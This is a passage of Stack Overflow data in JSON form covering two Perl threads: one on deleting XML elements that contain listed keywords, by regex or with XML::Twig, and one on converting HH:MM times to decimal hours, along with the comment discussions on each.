"https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463411909, "post_id": 37165258, "comment_id": 62041681, "body": "Can the following script be enhanced to work for different inner tag names, different than line2, line3 .... line9,  if the inner-tag names are kty, pst, mct and so on which do not have anything in common,                                                                     ............................................................&zwnj;&#8203;....................&zwnj;&#8203;....................&zwnj;&#8203;..........# # Repeatedly eliminate inner &lt;link...&gt; elements  # while ($record =~ /&lt;line[0-9]&gt;/) {     $record =~ s#&lt;(line[0-9])&gt;[^&lt;]*&lt;/\\1&gt;##ig; }"}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "reply_to_user": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463481200, "post_id": 37165258, "comment_id": 62072783, "body": "Sure,just add them to an alternation of tag names: <code>($record =~ &#47;&lt;(line[0-9]|kty|mct|pst)&gt;&#47;) { $record =~ s#&lt;(line[0-9]|kty|mct|pst)&gt;[^&lt;]*&lt;&#47;\\1&gt;##ig; }</code>."}], "tags": [], "owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "is_accepted": true, "score": -2, "last_activity_date": 1462975914, "creation_date": 1462975914, "answer_id": 37165258, "question_id": 37163642, "link": "https://stackoverflow.com/questions/37163642/script-enhancement-to-delete-unnecessary-tags-of-an-xml-file/37165258#37165258", "title": "Script enhancement to delete unnecessary tags of an XML file", "body": "<p>The following code handles the case of nested insignificant elements. It still doesn't admit for cdata sections in your xml.</p>\n\n<pre><code>use strict;\nuse warnings;\nmy @array = qw /abc de fghi jklm sdfe kk/;\nmy $filter = join '|', @array;\n\n#\n# The xmlprocessing is not line-oriented, thus the whole content can be read in a single sweep.\n#\nmy $record;\n{\n    local $/ = undef;\n    $record = &lt;DATA&gt;;\n}\n\n#\n# Repeatedly eliminate inner &lt;link...&gt; elements \n#\nwhile ($record =~ /&lt;line[0-9]&gt;/) {\n    $record =~ s#&lt;(line[0-9])&gt;[^&lt;]*&lt;/\\1&gt;##ig;\n}\n\n#\n# Filter according to the predefined list\n#\n$record =~ s/&lt;line&gt;[^&lt;]*\\b($filter)\\b[^&lt;]*&lt;\\/line&gt;//ig;\n\nprint $record if $record =~ /\\S/;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462976127, "post_id": 37165266, "comment_id": 61866123, "body": "Almost eerily similar to what I was about to post. Although I wasn&#39;t sure, because <i>think</i> the element containing <code>line2</code>, <code>line3</code> subelements gets pruned, because the <code>text</code> method gives you text from children too."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462977088, "post_id": 37165266, "comment_id": 61866841, "body": "@Sobrique: There are only so many ways of applying <code>XML::Twig</code>! And yes, you&#39;re right, <code>text</code> will include all <i>descendant</i> text nodes, not just the children. However the OP don&#39;t say what they want either way so I&#39;m happy with this for now. It&#39;s only a matter of changing <code>$line_text</code> to <code>$line-&gt;text_only</code> if the strings must appear only in the immediate child text nodes"}, {"owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463033609, "post_id": 37165266, "comment_id": 61891105, "body": "Can I use XML::SImple and perform a similar operation. As I am new to modules, how would I move forward !"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463035605, "post_id": 37165266, "comment_id": 61892126, "body": "@MikeFroetscher:  Moving to <code>XML::Simple</code> is a very <i>backward</i> step! <a href=\"http://stackoverflow.com/questions/33267765/why-is-xmlsimple-discouraged\"><i>Why is XML::Simple &quot;Discouraged&quot;?</i></a>"}, {"owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463047539, "post_id": 37165266, "comment_id": 61900394, "body": "Thank you Borodin for the feedback, can XML::SAX be utilized ?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463073550, "post_id": 37165266, "comment_id": 61919515, "body": "@MikeFroetscher: You could certainly use <a href=\"https://metacpan.org/pod/XML::SAX\" rel=\"nofollow noreferrer\">XML::SAX</a>, but the API is very different from the more common modules, and you should read <a href=\"https://metacpan.org/pod/XML::SAX::Intro\" rel=\"nofollow noreferrer\">XML::SAX::Intro</a> carefully first. SAX is a <i>push interface</i>, and <code>XML::SAX</code> requires that you create a separate Perl module that subclasses <a href=\"https://metacpan.org/pod/XML::SAX::Base\" rel=\"nofollow noreferrer\">XML::SAX::Base</a> and provides methods for all of the document <i>events</i> that you want to handle. You will also find fewer people with SAX expertise to help you if you get stuck"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463073701, "post_id": 37165266, "comment_id": 61919615, "body": "@MikeFroetscher: Can you explain why you&#39;re searching for an XML parser other than the ones I listed in my answer? You have picked a broken and deprecated module and a less popular, more esoteric one. What is it that you&#39;re looking for?"}, {"owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463075408, "post_id": 37165266, "comment_id": 61920647, "body": "I was browsing through <a href=\"https://metacpan.org/pod/XML::SAX#DESCRIPTION\" rel=\"nofollow noreferrer\">metacpan.org/pod/XML::SAX#DESCRIPTION</a>  And was interested to know the difference of the strategies followed in different modules, thank you for your help."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 1, "creation_date": 1463082178, "post_id": 37165266, "comment_id": 61924575, "body": "@MikeFroetscher: Essentially your choice is between modules that have a <i>Document Object Model</i> (DOM) API and a SAX-like API. The former will build a static Perl data structure that you may navigate and modify, while the latter\u2014which includes the original <code>XML::Parser</code>\u2014will inform you, via callbacks, of the nodes that it encounters while parsing some XML text. Experimenting with all of them would be very educational. <code>XML::Simple</code> fails by trying to map an XML document onto a simple nested Perl data structure. The two aren&#39;t isomorphic so it fails for anything but the most simple XML documents"}, {"owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463646429, "post_id": 37165266, "comment_id": 62155311, "body": "@Borodin, thank you. Using a module makes the life easier as compared with a regex when working with an XML file, where parsing needs to be taken into account."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1462976361, "last_edit_date": 1462976361, "creation_date": 1462975931, "answer_id": 37165266, "question_id": 37163642, "link": "https://stackoverflow.com/questions/37163642/script-enhancement-to-delete-unnecessary-tags-of-an-xml-file/37165266#37165266", "title": "Script enhancement to delete unnecessary tags of an XML file", "body": "<p>You need to use a proper XML parser instead of trying to hack it with regular expressions</p>\n\n<p>This program uses the <a href=\"https://metacpan.org/pod/XML::Twig\" rel=\"nofollow\"><code>XML::Twig</code></a> module. <a href=\"https://metacpan.org/pod/XML::LibXML\" rel=\"nofollow\"><code>XML::LibXML</code></a> is a good alternative if you prefer</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict; \nuse warnings; \n\nuse XML::Twig;\n\nmy @discard = qw / abc de fghi jklm sdfe kk/;  \nmy $filter = join '|', @discard; \n$filter = qr/\\b(?:$filter)\\b/;\n\nmy $twig = XML::Twig-&gt;new;\n$twig-&gt;parse(\\*DATA);\n\nfor my $line ( $twig-&gt;findnodes('//line') ) {\n    $line-&gt;delete if $line-&gt;text =~ $filter;\n}\n\n$twig-&gt;print;\n\n__DATA__\n&lt;data&gt;\n    &lt;line&gt; sdfe abc adsfefsdf &lt;/line&gt;   \n    &lt;line&gt; abc sdffedcfsdf sdf &lt;/line&gt; \n    &lt;line&gt; sdfe &lt;/line&gt;\n    &lt;line&gt; abc &lt;/line&gt;\n    &lt;line&gt; sd sfefsdf &lt;/line&gt; \n    &lt;line&gt;\n        sdfe abc \n        &lt;line2&gt; afw sdf a &lt;/line2&gt;\n        &lt;line3&gt; kasd ads fewf 2323 &lt;/line3&gt;\n        adsfefsdf\n    &lt;/line&gt; \n    &lt;line&gt; fhgh kk jj hjsda &lt;/line&gt;\n    &lt;line&gt; abc &lt;/line&gt; \n    .. \n    .. \n    .. \n&lt;/data&gt;\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;data&gt;&lt;line&gt; sd sfefsdf &lt;/line&gt; \n    .. \n    .. \n    .. \n&lt;/data&gt;\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "accepted_answer_id": 37165258, "answer_count": 2, "score": -1, "last_activity_date": 1462976361, "creation_date": 1462972021, "last_edit_date": 1462976221, "question_id": 37163642, "link": "https://stackoverflow.com/questions/37163642/script-enhancement-to-delete-unnecessary-tags-of-an-xml-file", "title": "Script enhancement to delete unnecessary tags of an XML file", "body": "<h3>Perl code</h3>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict; \nuse warnings; \n\nmy @array = qw / abc de fghi jklm sdfe kk/;  \nmy $filter = join '|', @array; \n$filter = qr/$filter/; \n\nwhile ( my $record = &lt;DATA&gt; ) { \n    $record =~ s/\\&lt;line\\&gt;[^&lt;]*?\\b$filter\\b[^&lt;]*?\\&lt;\\/line\\&gt;//ig; \n    print $record if $record =~ /\\S/;\n}\n</code></pre>\n\n<p>By using the above code on this XML data</p>\n\n<h3>XML File</h3>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;data&gt;\n&lt;line&gt; sdfe abc adsfefsdf &lt;/line&gt;\n&lt;line&gt; abc sdffedcfsdf sdf &lt;/line&gt; \n&lt;line&gt; sdfe &lt;/line&gt;&lt;line&gt; abc &lt;/line&gt;\n&lt;line&gt; sd sfefsdf &lt;/line&gt; \n&lt;line&gt; sdfe abc \n&lt;line2&gt; afw sdf a &lt;/line2&gt; &lt;line3&gt; kasd ads fewf 2323 &lt;/line3&gt;\nadsfefsdf &lt;/line&gt; \n&lt;line&gt; fhgh kk jj hjsda &lt;/line&gt;\n&lt;line&gt; abc &lt;/line&gt; \n.. \n.. \n.. \n&lt;/data&gt;\n</code></pre>\n\n<p>The following output is generated</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;data&gt;\n&lt;line&gt; sdfe &lt;/line&gt;\n&lt;line&gt; sd sfefsdf &lt;/line&gt; \n&lt;line&gt; sdfe abc \n&lt;line2&gt; afw sdf a &lt;/line2&gt; &lt;line3&gt; kasd ads fewf 2323 &lt;/line3&gt;\n.. \n.. \n.. \n&lt;/data&gt;\n</code></pre>\n\n<p>The expected output is as below</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;data&gt;\n&lt;line&gt; sdfe &lt;/line&gt;\n&lt;line&gt; sd sfefsdf &lt;/line&gt; \n.. \n.. \n.. \n&lt;/data&gt;\n</code></pre>\n\n<h3>Condition to be taken into account</h3>\n\n<p>The above indicates that the Perl script removes the tags containing elements <code>abc</code>, <code>de</code>, <code>fghi</code>, <code>jklm</code>, <code>sdfe</code>, or <code>kk</code>.</p>\n\n<p>For example, in the two lines of the XML file below</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;line&gt; abc sdffedcfsdf sdf &lt;/line&gt; \n&lt;line&gt; sdfe &lt;/line&gt; &lt;line&gt; abc &lt;/line&gt;\n</code></pre>\n\n<p>the original Perl code works and produces output </p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;line&gt; sdfe &lt;/line&gt;\n</code></pre>\n\n<p>If additional tags are present within an element, the code is not working. Can the script be enhanced so that additional tags within a tag that contains the desired elements to be removed are deleted.</p>\n\n<p>For example, given the XML data below</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;line&gt; sdfe abc \n&lt;line2&gt; afw sdf a &lt;/line2&gt; &lt;line3&gt; kasd ads fewf 2323 &lt;/line3&gt;\nadsfefsdf &lt;/line&gt; \n</code></pre>\n\n<p>Can the Perl code be enhanced such that it would remove the additional tags, and remove the line if the line contains removable elements <code>abc</code>, <code>de</code>, <code>fghi</code>, <code>jklm</code>, <code>sdfe</code>, or <code>kk</code> inclusive of unnecessary additional tags?</p>\n"}, {"tags": ["regex", "perl", "awk"], "comments": [{"owner": {"reputation": 13433, "user_id": 874178, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/AdjGb.jpg?s=128&g=1", "display_name": "sat", "link": "https://stackoverflow.com/users/874178/sat"}, "edited": false, "score": 0, "creation_date": 1462968538, "post_id": 37162208, "comment_id": 61859747, "body": "Don&#39;t understand that how did you get  <code>12:30</code> -&gt; <code>12,5</code> ?"}, {"owner": {"reputation": 340, "user_id": 3689007, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/6NHYN.png?s=128&g=1", "display_name": "Macieyo", "link": "https://stackoverflow.com/users/3689007/macieyo"}, "reply_to_user": {"reputation": 13433, "user_id": 874178, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/AdjGb.jpg?s=128&g=1", "display_name": "sat", "link": "https://stackoverflow.com/users/874178/sat"}, "edited": false, "score": 0, "creation_date": 1462968752, "post_id": 37162208, "comment_id": 61859915, "body": "We have HH:MM format and 12:30 in such is a 12 + 1/2 becouse we have minutes in scope of 0-59. Probably i see your point but half satisfies me"}, {"owner": {"reputation": 430, "user_id": 2635790, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6I9kD.png?s=128&g=1", "display_name": "ej_f", "link": "https://stackoverflow.com/users/2635790/ej-f"}, "edited": false, "score": 1, "creation_date": 1462968940, "post_id": 37162208, "comment_id": 61860066, "body": "Why you need to use regex? your input is messy?"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462969096, "post_id": 37162208, "comment_id": 61860188, "body": "How is say 12:17, displayed in the decimal format ?"}, {"owner": {"reputation": 340, "user_id": 3689007, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/6NHYN.png?s=128&g=1", "display_name": "Macieyo", "link": "https://stackoverflow.com/users/3689007/macieyo"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462969124, "post_id": 37162208, "comment_id": 61860208, "body": "Sometimes strange characters occurs in file so thats why I am trying regex approach - it should solve the problem @123 Thanks for interest - 12:17 should give 12,17"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 2, "creation_date": 1462969413, "post_id": 37162208, "comment_id": 61860406, "body": "@DawidP Well that doesn&#39;t make sense at all with what you originally said"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462969653, "post_id": 37162208, "comment_id": 61860587, "body": "<a href=\"https://stackoverflow.com/posts/37162208/edit\">edit</a> your question to include a few lines of concise, testable sample input and expected output so we can best help you. Also clarify if you are only looking for a perl solution or not. Finally, as @123 said, <code>12:30 -&gt; 12,5</code> while <code>12:17 -&gt; 12,17</code> makes no obvious sense so explain the mapping."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462970089, "post_id": 37162208, "comment_id": 61860944, "body": "Why is <code>12:17</code> changed to <code>12,17</code> when <code>12:30</code> becomes <code>12,5</code>? I would expect <code>12,283</code>"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462970354, "post_id": 37162208, "comment_id": 61861138, "body": "@Borodin Yep, tbh i just wanted to know how accurate they wanted the rounding, as many times cannot be accurately displayed as decimals."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462970826, "post_id": 37162208, "comment_id": 61861566, "body": "@123: Hundredths of an hour should be enough, as minutes are less accurate than that"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462971097, "post_id": 37162208, "comment_id": 61861812, "body": "@Borodin Minutes are more accurate as they are whole divisions, you are going to be rounding with the decimals,as there is a loss of accuracy with the conversion. Whereas if the original timings were taken in hundredths of a hour then they would be more accurate, yes."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462971489, "post_id": 37162208, "comment_id": 61862185, "body": "@123: A time like <code>12:30</code> covers everything from <code>12:29:30</code> to <code>12:30:30</code> and so is less precise than hundredths of an hour, which cover 36 seconds each. Every minute converts to a different number of hundredths of an hour, so no accuracy is lost"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462971767, "post_id": 37162208, "comment_id": 61862414, "body": "@Borodin As i said, hundredths of a second is obviously more accurate, but converting loses accuracy, regardless of whether all the number are different. You can see this if you multiply your rounding back up, where you will need to round again the get the whole minute."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462973464, "post_id": 37162208, "comment_id": 61863824, "body": "@123: No, it <i>doesn&#39;t</i> lose accuracy. <code>HH:MM</code> is accurate only to the nearest minute, and multiplying the converted number back up gives you a number closest to the <i>same minute</i>. <code>12:30</code> doesn&#39;t mean <i>exactly half past midday</i>. <code>12:30:00.000</code> is a lot closer to meaning that, but is still only accurate to the nearest millisecond. <a href=\"https://en.wikipedia.org/wiki/Accuracy_and_precision\" rel=\"nofollow noreferrer\"><i>Accuracy and Precision</i></a>"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462977231, "post_id": 37162208, "comment_id": 61866950, "body": "@Borodin Accuracy and precision is irrelevant here as there is only a single measurement. Also i understand what you are saying about the closest minute but it isn&#39;t to the closest minute, the time is truncated  but yeah I was talking as though they are full minutes and you lose accuracy from the original meaning. Either way i doubt OP cares anyway so it doesn&#39;t actually matter."}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 5, "last_activity_date": 1462969282, "last_edit_date": 1462969282, "creation_date": 1462969207, "answer_id": 37162526, "question_id": 37162208, "link": "https://stackoverflow.com/questions/37162208/convert-hhmm-into-decimal-hours/37162526#37162526", "title": "Convert HH:MM into decimal hours", "body": "<p>I would not use a regular expression for converting. It can be done with pretty simple math. Parse out the times using your search pattern, and then pass it through something like this.</p>\n\n<pre><code>sub to_decimal {\n    my $time = shift;\n\n    my ($hours, $minutes) = split /:/, $time;\n    my $decimal = sprintf '%.02d', ($minutes / 60) * 100 ;\n\n    return join ',', $hours, $decimal;\n}\n</code></pre>\n\n<p>If you run it in a loop like this:</p>\n\n<pre><code>for (qw(00 01 05 10 15 20 25 30 35 40 45 50 55 58 59)) {\n    say \"$_ =&gt; \" . to_decimal(\"12:$_\");\n}\n</code></pre>\n\n<p>You get:</p>\n\n<pre><code>00 =&gt; 12,00\n01 =&gt; 12,01\n05 =&gt; 12,08\n10 =&gt; 12,16\n15 =&gt; 12,25\n20 =&gt; 12,33\n25 =&gt; 12,41\n30 =&gt; 12,50\n35 =&gt; 12,58\n40 =&gt; 12,66\n45 =&gt; 12,75\n50 =&gt; 12,83\n55 =&gt; 12,91\n58 =&gt; 12,96\n59 =&gt; 12,98\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462970495, "post_id": 37162580, "comment_id": 61861266, "body": "Do spaces not matter when using curly brackets? Also if so, how do you match spaces ?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 1, "creation_date": 1462970983, "post_id": 37162580, "comment_id": 61861698, "body": "@123: The <code>&#47;x</code> modifier allows spaces (and comments) to be added to the regex for clarity. You can match a space by escaping it or using <code>\\x20</code>"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1467562902, "last_edit_date": 1467562902, "creation_date": 1462969344, "answer_id": 37162580, "question_id": 37162208, "link": "https://stackoverflow.com/questions/37162208/convert-hhmm-into-decimal-hours/37162580#37162580", "title": "Convert HH:MM into decimal hours", "body": "<p>This will achieve what you need. It uses an <em>executable substitution</em> to replace the time string by an expression in terms of the hour and minute values. 